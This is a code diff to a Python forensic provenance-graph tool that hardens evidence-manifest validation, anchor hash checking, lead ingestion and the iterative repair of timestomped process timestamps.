         out = {"source_file": src, "byte_offset": off, "length": length, "sha256": sha,
-               "source_type": anchor.get("source_type", ""), "offset_basis": basis}
+               "source_type": stype, "offset_basis": basis}
         if self._in_vault_image(src, basis):
             bad = self._overlaps_bad_sector(off, length)
             if bad is not None:
@@ -1662,6 +2026,9 @@ class TemporalProvenanceGraph:
         if self.verify_anchors:
             path = self._resolve_source(src)
             if path is None:
+                cand = None if src.startswith("artifact:") or src in self.source_paths else self._candidate_path(src)
+                if cand is not None and os.path.isfile(cand):
+                    raise ProvenanceError("OUTSIDE_EVIDENCE_ROOT")
                 raise ProvenanceError("UNVERIFIABLE_SOURCE_FILE")
             if self._rehash(path, off, length) != sha:
                 raise ProvenanceError("ANCHOR_HASH_MISMATCH")
@@ -1673,11 +2040,11 @@ class TemporalProvenanceGraph:
     def make_anchor(self, path: str, off: int, length: int, source_type: str, display: Optional[str] = None
                     ) -> Dict[str, Any]:
         """Build an anchor by hashing exactly [off, off+length) of the file on disk."""
+        name = self._source_name(path, display)
         digest = self._rehash(path, off, length)
-        self.source_paths[display or os.path.basename(path)] = os.path.abspath(path)
         if digest is None:
             raise ProvenanceError("SHORT_READ")
-        return {"source_file": display or os.path.basename(path), "byte_offset": off, "length": length,
+        return {"source_file": name, "byte_offset": off, "length": length,
                 "sha256": digest, "source_type": source_type, "offset_basis": "FILE"}
 
     def _reject(self, reason: str, detail: Dict[str, Any]) -> None:
@@ -1685,6 +2052,58 @@ class TemporalProvenanceGraph:
         self.rejected_count[code] += 1
         if len(self.rejected) < 1000:
             self.rejected.append(dict(detail, reason=reason))
+
+    def ingest_integrity(self) -> Dict[str, Any]:
+        """
+        Whether bytes offered at ingest still match the evidence. An anchor whose recorded SHA-256 no
+        longer matches the bytes at its offset (ANCHOR_HASH_MISMATCH) means the evidence or the manifest
+        was altered after the anchor was recorded: that edge is refused, and the run as a whole is an
+        INTEGRITY_FAILURE that D1 and validate_storyline must not pass.
+        """
+        n = int(self.rejected_count.get("ANCHOR_HASH_MISMATCH", 0))
+        leads = sorted({str(r.get("lead_id")) for r in self.leads_rejected
+                        if str(r.get("reason", "")).startswith("ANCHOR_HASH_MISMATCH")})
+        return {"status": "INTEGRITY_FAILURE" if n or leads else "OK", "anchor_hash_mismatches": n,
+                "leads": leads}
+
+    def _note_time_anomaly(self, value: Any, ns: Optional[int], where: str) -> None:
+        """A record time outside what an edge can carry (before 1970 or after 2554): kept, edge marked TIME_UNKNOWN."""
+        key = f"{where}|{value!r}"[:256]
+        if key in self._time_anomaly_keys or len(self.time_anomalies) >= UNREADABLE_CAP:
+            return
+        self._time_anomaly_keys.add(key)
+        self.time_anomalies.append({"value": str(value)[:64], "timestamp_ns": ns, "where": where,
+                                    "kept_as": "TIME_UNKNOWN"})
+
+    def _checked_anchors(self, src: Any, dst: Any, rel: int, anchor: Any, secondary_anchors: Any
+                         ) -> Tuple[Dict[str, Any], Dict[str, Dict[str, Any]]]:
+        """Normalise the primary and secondary anchors; a failure is recorded as a rejection and re-raised."""
+        try:
+            a = self.normalize_anchor(anchor)
+            if secondary_anchors is not None and not isinstance(secondary_anchors, dict):
+                raise ProvenanceError("MISSING_ANCHOR")
+            sec = {k: self.normalize_anchor(v) for k, v in (secondary_anchors or {}).items()}
+        except ProvenanceError as exc:
+            self._reject(str(exc), {"src": list(src) if isinstance(src, (tuple, list)) else str(src),
+                                    "dst": list(dst) if isinstance(dst, (tuple, list)) else str(dst),
+                                    "relation": RELATION_NAMES.get(rel, rel) if isinstance(rel, int) else str(rel),
+                                    "anchor": anchor if isinstance(anchor, dict) else None})
+            raise
+        return a, sec
+
+    @staticmethod
+    def _check_edge_fields(src: Any, dst: Any, rel: Any, ts_ns: Any) -> int:
+        """Relation, entities and timestamp of an edge, checked before anything is stored."""
+        if rel not in RELATION_NAMES:
+            raise ValueError(f"unknown relation {rel}")
+        for ent in (src, dst):
+            if (not isinstance(ent, (tuple, list)) or len(ent) != 2 or ent[0] not in ENTITY_KINDS
+                    or not isinstance(ent[1], str) or not ent[1]):
+                raise ValueError(f"entity must be (kind, non-empty name): {ent!r}"[:200])
+        ts_ns = int(ts_ns or 0)
+        if ts_ns < 0 or ts_ns > CSRGraphArena.MAX_TS:
+            raise ValueError("timestamp out of range")
+        return ts_ns
 
     # ----- edges ----------------------------------------------------------- #
 
@@ -1695,19 +2114,12 @@ class TemporalProvenanceGraph:
         """
         Insert one edge. Raises ProvenanceError (and records the rejection) when the primary or any
         secondary anchor is incomplete, falls in a bad sector, cannot be found, or does not re-hash.
+        Raises ValueError, before anything is stored, for an unknown relation, an entity that is not a
+        (kind, non-empty string) pair, or a timestamp outside 0..2^64-1 ns (parsers clamp record times
+        with _ts(), so this is a guard against programming errors).
         """
-        try:
-            a = self.normalize_anchor(anchor)
-            sec = {k: self.normalize_anchor(v) for k, v in (secondary_anchors or {}).items()}
-        except ProvenanceError as exc:
-            self._reject(str(exc), {"src": list(src), "dst": list(dst), "relation": RELATION_NAMES.get(rel, rel),
-                                    "anchor": anchor if isinstance(anchor, dict) else None})
-            raise
-        if rel not in RELATION_NAMES:
-            raise ValueError(f"unknown relation {rel}")
-        ts_ns = int(ts_ns or 0)
-        if ts_ns < 0 or ts_ns > CSRGraphArena.MAX_TS:
-            raise ValueError("timestamp out of range")
+        a, sec = self._checked_anchors(src, dst, rel, anchor, secondary_anchors)
+        ts_ns = self._check_edge_fields(src, dst, rel, ts_ns)
         loss = score_to_q16(score)
         if score is not None and score >= 0.5:
             flags |= FLAG_SUSPICIOUS
@@ -1738,11 +2150,15 @@ class TemporalProvenanceGraph:
 
     def _append(self, src_id: int, dst_id: int, rel: int, flags: int, ts_ns: int, a: Dict[str, Any], loss: int,
                 meta: Optional[Dict[str, Any]], sec: Dict[str, Dict[str, Any]]) -> int:
+        # both fixed-size records are packed first: a value that does not fit raises here, before the arena,
+        # the ledger or any reference count changes, so an edge can never be stored without its own anchor
+        six = self.ledger.intern_source(a["source_file"], a["source_type"], a["offset_basis"])
+        self.ledger.RECORD.pack(six, a["byte_offset"], a["length"], bytes.fromhex(a["sha256"]))
+        self.arena.RECORD.pack(src_id, dst_id, rel, flags & 0xFFFF, ts_ns, a["byte_offset"], loss)
         # pin both ends while the ring may evict, so an id is never released and reused mid-insert
         self.entities.incref(src_id)
         self.entities.incref(dst_id)
         seq = self.arena.append(src_id, dst_id, rel, flags, ts_ns, a["byte_offset"], loss)
-        six = self.ledger.intern_source(a["source_file"], a["source_type"], a["offset_basis"])
         self.ledger.put(seq, six, a["byte_offset"], a["length"], a["sha256"])
         self.supernode.degree[(src_id, rel)] += 1
         if rel == REL_SPAWNED and ts_ns:
@@ -1839,6 +2255,21 @@ class TemporalProvenanceGraph:
                     best = r[4] if best is None else min(best, r[4])
         return best
 
+    def _refresh_birth(self, repaired_seqs: Sequence[int]) -> bool:
+        """After repairs, a child's creation time is again the earliest (now repaired) SPAWNED edge into it."""
+        kids = {r[1] for r in (self.arena.record(q) for q in repaired_seqs) if r[2] == REL_SPAWNED}
+        if not kids:
+            return False
+        rptr, rseqs = self.arena.build_csr(len(self.entities), reverse=True)
+        changed = False
+        for d in sorted(kids):
+            times = [r[4] for r in (self.arena.record(rseqs[k]) for k in range(rptr[d], rptr[d + 1]))
+                     if r[2] == REL_SPAWNED and r[4]]
+            if times and min(times) != self.created_ts.get(d):
+                self.created_ts[d] = min(times)
+                changed = True
+        return changed
+
     def check_causality(self, tolerance_ns: int = NS, repair: bool = True) -> Dict[str, Any]:
         """
         t(child action) >= t(parent process creation) for every process action edge. A violation is a
@@ -1855,70 +2286,78 @@ class TemporalProvenanceGraph:
         the records where every timestamp was rewritten.
         """
         n = len(self.entities)
-        row_ptr, seqs = self.arena.build_csr(n)
         paradoxes, repaired = [], 0
-        # Pass 1: find every inverted edge on the recorded times. Pass 2 computes each repair from
-        # that same snapshot (inverted edges are never used as bounds), in byte-offset order, so the
-        # result and the audit chain do not depend on the order evidence was ingested.
-        viol = []
-        for seq in self.arena.live_seqs():
-            s, d, rel, fl, ts, off, loss = self.arena.record(seq)
-            if rel not in PROCESS_ACTION_RELATIONS or self.entities.kinds[s] != "PROCESS" or not ts:
-                continue
-            born = self.created_ts.get(s)
-            if born is None or ts >= born - tolerance_ns or fl & FLAG_TIME_REPAIRED:
-                continue
-            p = self.ledger.get(seq)
-            viol.append(((off, p["source_file"], p["length"], p["sha256"], rel, self.entities.key(s),
-                          self.entities.key(d)), seq))
-        viol.sort()
-        untrusted = {q for _k, q in viol}
-        plans = []
-        for _k, seq in viol:
-            s, d, rel, fl, ts, off, loss = self.arena.record(seq)
-            born = self.created_ts[s]
-            rec = {"rule": "TEMPORAL_PARADOX_INVERSION", "edge_uid": self.edge_uid(self.edge(seq)),
-                   "parent": self.entities.label(s), "child": self.entities.label(d),
-                   "relation": RELATION_NAMES[rel], "recorded_utc": ns_to_iso(ts), "parent_created_utc": ns_to_iso(born)}
-            if repair:
-                meta = self.edge_meta.setdefault(seq, {})
-                upper = self._downstream_bound(seq, s, d, rel, row_ptr, seqs, untrusted)
-                hosts = set(meta.get("payload_source_hosts") or [])
-                basis, basis_seq, new_ts, rejected_sock = "PARENT_PROCESS_CREATION", None, born, None
-                if hosts:
-                    socks = []
-                    for k in range(row_ptr[s], row_ptr[s + 1]):
-                        q = seqs[k]
-                        _, d2, r2, f2, t2, o2, _ = self.arena.record(q)
-                        name = self.entities.names[d2] or ""
-                        if (r2 == REL_CONNECTED_TO and t2 >= born and q not in untrusted
-                                and name.rsplit(":", 1)[0] in hosts):
-                            socks.append((t2, o2, q))
-                    if socks:
-                        t_sock, _, q = min(socks)
-                        if upper is None or t_sock <= upper:
-                            new_ts, basis_seq, basis = t_sock, q, "PARENT_DOWNLOAD_CONNECTION"
-                        else:
-                            rejected_sock = ns_to_iso(t_sock)
-                plans.append((seq, new_ts, fl))
-                basis_anchor = self.ledger.get(basis_seq) if basis_seq is not None else None
-                note = {"recorded_utc": ns_to_iso(ts), "recorded_ns": ts, "repaired_utc": ns_to_iso(new_ts),
-                        "repaired_ns": new_ts, "upper_bound_utc": ns_to_iso(upper) if upper else None,
-                        "basis": basis, "semantics": "LOWER_BOUND (not earlier than)", "basis_anchor": basis_anchor}
-                if upper is not None and new_ts > upper:
-                    note["bounds_conflict"] = "lower bound is after the earliest downstream use; examiner to explain"
-                if rejected_sock:
-                    note["socket_not_used"] = f"connection at {rejected_sock} is after the upper bound"
-                meta["timestamp_repair"] = note
-                meta["recorded_timestamp_ns"] = ts
-                self.audit.append(dict(rec, action="TIMESTAMP_REPAIRED",
-                                       **{k: v for k, v in note.items() if k != "basis_anchor"},
-                                       basis_anchor_sha256=basis_anchor["sha256"] if basis_anchor else None))
-                rec.update(repaired_utc=ns_to_iso(new_ts), basis=basis)
-                repaired += 1
-            paradoxes.append(rec)
-        for seq, new_ts, fl in plans:
-            self.arena.update(seq, ts=new_ts, flags=fl | FLAG_TIMESTOMP_INVERTED | FLAG_TIME_REPAIRED)
+        # Repeated until nothing changes: a repaired SPAWNED edge moves its child's birth later, so the
+        # child's own actions are checked again against that birth (and so on down the spawn tree).
+        # Every round repairs at least one edge, which is then never re-examined, so this terminates.
+        for _round in range(self.arena.count + 1):
+            row_ptr, seqs = self.arena.build_csr(n)
+            # Pass 1: find every inverted edge on the recorded times. Pass 2 computes each repair from
+            # that same snapshot (inverted edges are never used as bounds), in byte-offset order, so the
+            # result and the audit chain do not depend on the order evidence was ingested.
+            viol = []
+            for seq in self.arena.live_seqs():
+                s, d, rel, fl, ts, off, loss = self.arena.record(seq)
+                if rel not in PROCESS_ACTION_RELATIONS or self.entities.kinds[s] != "PROCESS" or not ts:
+                    continue
+                born = self.created_ts.get(s)
+                if born is None or ts >= born - tolerance_ns or fl & FLAG_TIME_REPAIRED:
+                    continue
+                p = self.ledger.get(seq)
+                viol.append(((off, p["source_file"], p["length"], p["sha256"], rel, self.entities.key(s),
+                              self.entities.key(d)), seq))
+            if not viol:
+                break
+            viol.sort()
+            untrusted = {q for _k, q in viol}
+            plans = []
+            for _k, seq in viol:
+                s, d, rel, fl, ts, off, loss = self.arena.record(seq)
+                born = self.created_ts[s]
+                rec = {"rule": "TEMPORAL_PARADOX_INVERSION", "edge_uid": self.edge_uid(self.edge(seq)),
+                       "parent": self.entities.label(s), "child": self.entities.label(d),
+                       "relation": RELATION_NAMES[rel], "recorded_utc": ns_to_iso(ts), "parent_created_utc": ns_to_iso(born)}
+                if repair:
+                    meta = self.edge_meta.setdefault(seq, {})
+                    upper = self._downstream_bound(seq, s, d, rel, row_ptr, seqs, untrusted)
+                    hosts = set(meta.get("payload_source_hosts") or [])
+                    basis, basis_seq, new_ts, rejected_sock = "PARENT_PROCESS_CREATION", None, born, None
+                    if hosts:
+                        socks = []
+                        for k in range(row_ptr[s], row_ptr[s + 1]):
+                            q = seqs[k]
+                            _, d2, r2, f2, t2, o2, _ = self.arena.record(q)
+                            name = self.entities.names[d2] or ""
+                            if (r2 == REL_CONNECTED_TO and t2 >= born and q not in untrusted
+                                    and name.rsplit(":", 1)[0] in hosts):
+                                socks.append((t2, o2, q))
+                        if socks:
+                            t_sock, _, q = min(socks)
+                            if upper is None or t_sock <= upper:
+                                new_ts, basis_seq, basis = t_sock, q, "PARENT_DOWNLOAD_CONNECTION"
+                            else:
+                                rejected_sock = ns_to_iso(t_sock)
+                    plans.append((seq, new_ts, fl))
+                    basis_anchor = self.ledger.get(basis_seq) if basis_seq is not None else None
+                    note = {"recorded_utc": ns_to_iso(ts), "recorded_ns": ts, "repaired_utc": ns_to_iso(new_ts),
+                            "repaired_ns": new_ts, "upper_bound_utc": ns_to_iso(upper) if upper else None,
+                            "basis": basis, "semantics": "LOWER_BOUND (not earlier than)", "basis_anchor": basis_anchor}
+                    if upper is not None and new_ts > upper:
+                        note["bounds_conflict"] = "lower bound is after the earliest downstream use; examiner to explain"
+                    if rejected_sock:
+                        note["socket_not_used"] = f"connection at {rejected_sock} is after the upper bound"
+                    meta["timestamp_repair"] = note
+                    meta["recorded_timestamp_ns"] = ts
+                    self.audit.append(dict(rec, action="TIMESTAMP_REPAIRED",
+                                           **{k: v for k, v in note.items() if k != "basis_anchor"},
+                                           basis_anchor_sha256=basis_anchor["sha256"] if basis_anchor else None))
+                    rec.update(repaired_utc=ns_to_iso(new_ts), basis=basis)
+                    repaired += 1
+                paradoxes.append(rec)
+            for seq, new_ts, fl in plans:
+                self.arena.update(seq, ts=new_ts, flags=fl | FLAG_TIMESTOMP_INVERTED | FLAG_TIME_REPAIRED)
+            if not repair or not self._refresh_birth([q for q, _t, _f in plans]):
+                break
         unresolved = sum(1 for p in paradoxes if "repaired_utc" not in p)
         prior = self.causality_report or {"paradoxes": [], "repaired": 0}
         report = {"checked_edges": self.arena.count, "paradoxes_detected": len(prior["paradoxes"]) + len(paradoxes),
@@ -1934,23 +2373,35 @@ class TemporalProvenanceGraph:
         if isinstance(manifest, str):
             with open(manifest, "r", encoding="utf-8") as f:
                 manifest = json.load(f)
+        if not isinstance(manifest, dict):
+            raise ValueError("MANIFEST_MALFORMED: evidence manifest is not a JSON object")
         if manifest.get("case_reference") and manifest["case_reference"] != self.case_id:
-            raise ValueError(f"evidence manifest is for {manifest['case_reference']}, not {self.case_id}")
+            raise IntegrityError(f"evidence manifest is for {manifest['case_reference']}, not {self.case_id}")
         digest_status = "UNVERIFIED (sector_a_vault.py not found beside this file)"
         canon = getattr(_sector_a, "_canonical_json", None)
         if canon is not None:
             body = {k: v for k, v in manifest.items() if k != "manifest_canonical_sha256"}
             if hashlib.sha256(canon(body)).hexdigest() != manifest.get("manifest_canonical_sha256"):
-                raise ValueError("evidence_manifest.json canonical digest mismatch (manifest altered)")
+                raise IntegrityError("evidence_manifest.json canonical digest mismatch (manifest altered)")
             digest_status = "VERIFIED"
         bsm = manifest.get("bad_sector_manifest") or {}
-        self.sector_size = int(bsm.get("sector_size_bytes", 4096))
-        self.bad_sectors = sorted(set(int(b) for b in bsm.get("bad_sectors", [])))
-        media = manifest.get("evidence_media", {})
+        media = manifest.get("evidence_media") or {}
+        h = manifest.get("cryptographic_hashes") or {}
+        adm = manifest.get("admissibility") or {}
+        for key, part in (("bad_sector_manifest", bsm), ("evidence_media", media), ("cryptographic_hashes", h),
+                          ("admissibility", adm)):
+            if not isinstance(part, dict):
+                raise ValueError(f"MANIFEST_MALFORMED: {key} is not a JSON object")
+        size, bad = bsm.get("sector_size_bytes", 4096), bsm.get("bad_sectors") or []
+        if not isinstance(size, int) or isinstance(size, bool) or size <= 0:
+            raise ValueError(f"MANIFEST_MALFORMED: sector_size_bytes {size!r} is not a positive integer")
+        if not isinstance(bad, list) or not all(isinstance(b, int) and not isinstance(b, bool) and b >= 0 for b in bad):
+            raise ValueError("MANIFEST_MALFORMED: bad_sectors must be a list of sector numbers")
+        self.sector_size = size
+        self.bad_sectors = sorted(set(bad))
         for k in ("filename", "acquired_image"):
             if media.get(k):
-                self.vault_files.add(os.path.basename(media[k]))
-        h = manifest.get("cryptographic_hashes", {})
+                self.vault_files.add(os.path.basename(str(media[k])))
         if h.get("master_case_root_v3"):
             self.audit.rebase(h["master_case_root_v3"])
         self.sector_a = {"vault_version": manifest.get("version"), "evidence_id": manifest.get("evidence_id"),
@@ -1960,7 +2411,8 @@ class TemporalProvenanceGraph:
                          "master_case_root_v3": h.get("master_case_root_v3"),
                          "manifest_canonical_sha256": manifest.get("manifest_canonical_sha256"),
                          "manifest_digest": digest_status,
-                         "admissibility_status": (manifest.get("admissibility") or {}).get("status"),
+                         "admissibility_status": adm.get("status"),
+                         "admissibility_blocking_issues": [str(x) for x in (adm.get("blocking_issues") or [])][:20],
                          "bad_sectors": list(self.bad_sectors), "sector_size_bytes": self.sector_size}
         return self.sector_a
 
@@ -1968,13 +2420,17 @@ class TemporalProvenanceGraph:
                                verify_anchors: Optional[bool] = None) -> Dict[str, Any]:
         """
         Convert every Sector B lead (symbolic anchor P_sym) into graph edges. Leads whose anchor fails
-        the provenance rule are listed in leads_rejected, never silently dropped.
+        the provenance rule, or whose content cannot be converted (MALFORMED_LEAD), are listed in
+        leads_rejected, never silently dropped. Each lead is checked in full before its first edge is
+        stored, so a refused lead leaves no edge behind.
         """
         if isinstance(manifest, str):
             if evidence_root is None:
                 evidence_root = os.path.dirname(os.path.abspath(manifest))
             with open(manifest, "r", encoding="utf-8") as f:
                 manifest = json.load(f)
+        if not isinstance(manifest, dict):
+            raise ValueError("MANIFEST_MALFORMED: triage manifest is not a JSON object")
         if evidence_root:
             self.evidence_root = evidence_root
         if verify_anchors is not None:
@@ -1982,37 +2438,68 @@ class TemporalProvenanceGraph:
         validate = getattr(_sector_b, "validate_manifest", None)
         schema = "UNVERIFIED (sector_b_triage.py not found beside this file)"
         if validate is not None:
-            problems = validate(manifest)
+            try:
+                problems = validate(manifest)
+            except _MALFORMED_ERRORS as exc:      # Sector B's own schema check could not read the document
+                raise ValueError(f"MANIFEST_MALFORMED: triage manifest unreadable by Sector B's validator "
+                                 f"({type(exc).__name__}: {exc})"[:300]) from None
             if problems:
-                raise ValueError(f"triage_manifest.json failed validation: {problems[:5]}")
+                # a manifest that no longer matches its own digest was altered: an integrity tripwire
+                bad = IntegrityError if any("manifest_sha256" in str(x) for x in problems) else ValueError
+                raise bad(f"triage_manifest.json failed validation: {problems[:5]}")
             schema = "VERIFIED"
         if manifest.get("case_id") and manifest["case_id"] != self.case_id:
-            raise ValueError(f"triage manifest is for {manifest['case_id']}, not {self.case_id}")
+            raise IntegrityError(f"triage manifest is for {manifest['case_id']}, not {self.case_id}")
         b_bind = manifest.get("sector_a_binding") or {}
+        if not isinstance(b_bind, dict):
+            raise ValueError("MANIFEST_MALFORMED: sector_a_binding is not a JSON object")
         if self.sector_a and b_bind.get("sha256_linear_primary") and \
                 b_bind["sha256_linear_primary"] != self.sector_a["sha256_linear_primary"]:
-            raise ValueError("triage manifest is bound to a different Sector A acquisition")
+            raise IntegrityError("triage manifest is bound to a different Sector A acquisition")
+        leads = manifest.get("symbolic_anchors", [])
+        if not isinstance(leads, list):
+            raise ValueError("MANIFEST_MALFORMED: symbolic_anchors is not a list")
         self.sector_b = {"triage_version": manifest.get("version"), "case_id": manifest.get("case_id"),
                          "triage_timestamp_utc": manifest.get("triage_timestamp_utc"),
                          "manifest_sha256": manifest.get("manifest_sha256"), "schema": schema,
-                         "leads": len(manifest.get("symbolic_anchors", []))}
+                         "leads": len(leads)}
         self.exculpatory_checklist = manifest.get("section45_exculpatory_checklist")
-        leads = manifest.get("symbolic_anchors", [])
         session_ts: Dict[str, int] = {}
         for l in leads:
-            cand = (l.get("lead_details") or {}).get("candidate") or {}
-            sid = cand.get("call_id") or (l.get("symbolic_anchor") or {}).get("session_id")
+            det = l.get("lead_details") if isinstance(l, dict) else None
+            cand = det.get("candidate") if isinstance(det, dict) else None
+            cand = cand if isinstance(cand, dict) else {}
+            sa = l.get("symbolic_anchor") if isinstance(l, dict) else None
+            sid = cand.get("call_id") or (sa.get("session_id") if isinstance(sa, dict) else None)
             t = self._ts(cand.get("timestamp_utc"))
-            if sid and t and (sid not in session_ts or t < session_ts[sid]):
+            if isinstance(sid, str) and sid and t and (sid not in session_ts or t < session_ts[sid]):
                 session_ts[sid] = t
         added = 0
         for l in leads:
-            lid = l.get("lead_id", "?")
+            lid = l.get("lead_id", "?") if isinstance(l, dict) else "?"
+            lid = lid if isinstance(lid, str) else str(lid)
+            reason = None
+            stats = Counter(self.anchor_stats)
             try:
-                seqs = self._lead_to_edges(l, session_ts)
+                if not isinstance(l, dict):
+                    raise TypeError("lead is not a JSON object")
+                self._lead_to_edges(l, session_ts, dry=True)      # every anchor, entity and time; stores nothing
             except ProvenanceError as exc:
-                self.leads_rejected.append({"lead_id": lid, "reason": str(exc)})
-                self.audit.append({"action": "LEAD_REJECTED", "lead_id": lid, "reason": str(exc)})
+                reason = str(exc)
+            except _MALFORMED_ERRORS as exc:
+                reason = f"MALFORMED_LEAD:{type(exc).__name__}: {exc}"[:300]
+            finally:
+                self.anchor_stats = stats
+            if reason is None:
+                try:
+                    seqs = self._lead_to_edges(l, session_ts)
+                except ProvenanceError as exc:
+                    reason = str(exc)
+                except _MALFORMED_ERRORS as exc:
+                    reason = f"MALFORMED_LEAD:{type(exc).__name__}: {exc}"[:300]
+            if reason is not None:
+                self.leads_rejected.append({"lead_id": lid, "reason": reason})
+                self.audit.append({"action": "LEAD_REJECTED", "lead_id": lid, "reason": reason})
                 continue
             self.lead_edges[lid] = seqs
             added += len(seqs)
@@ -2025,60 +2512,91 @@ class TemporalProvenanceGraph:
         seizure memo): a JSON list of {"src": [kind, name], "dst": [kind, name], "relation": "OWNS" |
         "LOGGED_IN_AS" | "OBSERVED_ON" | "RESOLVES_TO", "document": file, "quote": exact text}.
         The quote must occur exactly once in the document; its byte range becomes the anchor, so a
-        binding goes through the same provenance rule as any other edge. Nothing is inferred.
+        binding goes through the same provenance rule as any other edge. Nothing is inferred. The
+        document must lie in the bindings file's folder or the evidence root, and is searched in
+        bounded chunks (any size).
         """
         with open(path, "r", encoding="utf-8") as f:
             items = json.load(f)
+        if not isinstance(items, list):
+            raise ValueError("MANIFEST_MALFORMED: case bindings must be a JSON list of objects")
         base = os.path.dirname(os.path.abspath(path))
+        roots = [base] + ([self.evidence_root] if self.evidence_root else [])
         added, refused = 0, []
         for i, b in enumerate(items):
             try:
+                if not isinstance(b, dict):
+                    raise TypeError("binding is not a JSON object")
                 rel = RELATION_BY_NAME[b["relation"]]
                 if rel not in BINDING_RELATIONS:
                     raise ValueError(f"{b['relation']} is not an attribution relation")
                 doc = b["document"]
-                dpath = doc if os.path.isabs(doc) else (self._resolve_source(doc) or os.path.join(base, doc))
-                with open(dpath, "rb") as f:
-                    data = f.read()
+                if not isinstance(doc, str) or not doc:
+                    raise TypeError("document must be a file name")
+                dpath = self.source_paths.get(doc)
+                if dpath is None:
+                    cands = [doc] if os.path.isabs(doc) else [os.path.join(r, doc) for r in roots[::-1]]
+                    found = [c for c in cands if os.path.isfile(c)]
+                    inside = [c for c in found if any(self._within(c, r) for r in roots)]
+                    if found and not inside:
+                        raise ProvenanceError("OUTSIDE_EVIDENCE_ROOT")
+                    dpath = inside[0] if inside else cands[-1]
                 q = b["quote"].encode("utf-8")
-                at = data.find(q)
-                if at < 0 or data.find(q, at + 1) >= 0:
+                if not q:
+                    raise ValueError("quote must be non-empty")
+                at, count = _find_unique(dpath, q)
+                if count != 1:
                     raise ValueError("quote must occur exactly once in the document")
                 anchor = self.make_anchor(dpath, at, len(q), b.get("source_type", "CASE_DOCUMENT"), doc)
                 self.add_edge(tuple(b["src"]), tuple(b["dst"]), rel, self._ts(b.get("timestamp_utc")), anchor, 0.0,
                               meta={"binding_basis": "CASE_DOCUMENT", "document": doc})
                 added += 1
-            except (KeyError, ValueError, OSError, ProvenanceError) as exc:
+            except (KeyError, ValueError, OSError, ProvenanceError, TypeError, AttributeError, IndexError) as exc:
                 refused.append({"index": i, "reason": str(exc)})
                 self.audit.append({"action": "BINDING_REFUSED", "index": i, "reason": str(exc)})
         return {"bindings_added": added, "bindings_refused": refused}
 
     def _ts(self, value: Any, local: bool = False) -> int:
+        """Record time -> Unix ns; 0 (unknown) when absent or unparseable. A time an edge cannot carry (before
+        1970, e.g. a backdated 1601 or 1965 stamp, or after 2554) is noted in time_anomalies and becomes 0, so
+        the record is kept with FLAG_TIME_UNKNOWN instead of aborting the ingest."""
         try:
-            return iso_to_ns(value, self.local_tz if local else datetime.timezone.utc)
-        except ValueError:
+            ns = iso_to_ns(value, self.local_tz if local else datetime.timezone.utc)
+        except (ValueError, TypeError, OverflowError):
             return 0
+        if ns < 0 or ns > CSRGraphArena.MAX_TS:
+            self._note_time_anomaly(value, ns, "RECORD_TIMESTAMP")
+            return 0
+        return ns
 
     def _endpoint_link(self, ent: Tuple[str, str], ip: Optional[str], ts: int, anchor: Dict[str, Any],
-                       out: Optional[List[int]] = None) -> None:
-        """Join records that name the same IP address through one HOST node (exact identifier match)."""
+                       out: Optional[List[int]] = None, meta: Optional[Dict[str, Any]] = None,
+                       dry: bool = False) -> None:
+        """Join records that name the same IP address through one HOST node (exact identifier match).
+        `meta` (the calling lead's id, category and time source) is carried on the binding edge."""
         if not ip:
             return
         try:
             ipaddress.ip_address(ip)
         except ValueError:
             return
+        if dry:
+            self._checked_anchors(ent, ("HOST", ip), REL_RESOLVES_TO, anchor, None)
+            self._check_edge_fields(ent, ("HOST", ip), REL_RESOLVES_TO, ts)
+            return
         key = (ent[1], ip, REL_RESOLVES_TO)
         if key in self._bindings_seen:
             return
         self._bindings_seen.add(key)
         seq = self.add_edge(ent, ("HOST", ip), REL_RESOLVES_TO, ts, anchor, 0.0,
-                            meta={"binding_basis": "SAME_IP_ADDRESS",
-                                  "caveat": "an IP behind CGNAT can be shared by different subscribers"})
+                            meta=dict(meta or {}, binding_basis="SAME_IP_ADDRESS",
+                                      caveat="an IP behind CGNAT can be shared by different subscribers"))
         if out is not None:
             out.append(seq)
 
-    def _lead_to_edges(self, lead: Dict[str, Any], session_ts: Dict[str, int]) -> List[int]:
+    def _lead_to_edges(self, lead: Dict[str, Any], session_ts: Dict[str, int], dry: bool = False) -> List[int]:
+        """Edges for one Sector B lead. With dry=True every edge is checked exactly as add_edge would check it
+        (anchors re-hashed, entities, times) but nothing is stored, so a lead is accepted or refused whole."""
         cat = lead.get("threat_category", "UNKNOWN")
         d = lead.get("lead_details") or {}
         a = lead.get("symbolic_anchor")
@@ -2086,10 +2604,16 @@ class TemporalProvenanceGraph:
         lid = lead.get("lead_id")
         meta = {"lead_id": lid, "threat_category": cat, "mitre": lead.get("mitre_technique")}
         st = (a or {}).get("source_type", "")
+        st = st if isinstance(st, str) else ""
         device = ("DEVICE", "android-handset" if st.startswith("ANDROID") else "windows-endpoint")
         out: List[int] = []
 
         def add(src, dst, rel, ts, anchor=a, sc=score, fl=0, sec=None, m=None):
+            if dry:
+                self._checked_anchors(src, dst, rel, anchor, sec)
+                self._check_edge_fields(src, dst, rel, ts)
+                out.append(-1)
+                return -1
             seq = self.add_edge(src, dst, rel, ts, anchor, sc, fl, dict(meta, **(m or {})), sec)
             out.append(seq)
             for ent in (src, dst):
@@ -2100,8 +2624,12 @@ class TemporalProvenanceGraph:
         def observed_on(ent, ts):
             key = (ent[1], device[1], REL_OBSERVED_ON)
             if key not in self._bindings_seen:
-                self._bindings_seen.add(key)
+                if not dry:
+                    self._bindings_seen.add(key)
                 add(ent, device, REL_OBSERVED_ON, ts, sc=0.0, m={"binding_basis": "RECORD_FROM_THIS_DEVICE"})
+
+        def link(ent, ip, ts, m=None):
+            self._endpoint_link(ent, ip, ts, a, out, dict(meta, **(m or {})), dry)
 
         if cat == "LOLBINS_COMMAND":
             parent = _basename(d.get("parent_image")) or "unknown-parent"
@@ -2110,11 +2638,14 @@ class TemporalProvenanceGraph:
             add(("PROCESS", parent), ("PROCESS", image), REL_SPAWNED, ts)
             observed_on(("PROCESS", parent), ts)
             text = "\n".join(x.get("text", "") for x in d.get("deobfuscation_layers", []))
-            for host, port in sorted(set(_URL_RX.findall(text))):
-                sock = ("SOCKET", f"{host}:{port or 80}")
-                self._iocs.add(host)
+            # the port the URL implies: explicit, else the scheme's default (https 443, ftp 21), not always 80
+            for host, port in sorted({(h, p or str(_DEFAULT_PORT[sch.lower()]))
+                                      for sch, h, p in _SCHEME_URL_RX.findall(text)}):
+                sock = ("SOCKET", f"{host}:{port}")
+                if not dry:
+                    self._iocs.add(host)
                 add(("PROCESS", image), sock, REL_CONNECTED_TO, ts, m={"inferred_from": "command line URL"})
-                self._endpoint_link(sock, host, ts, a, out)
+                link(sock, host, ts)
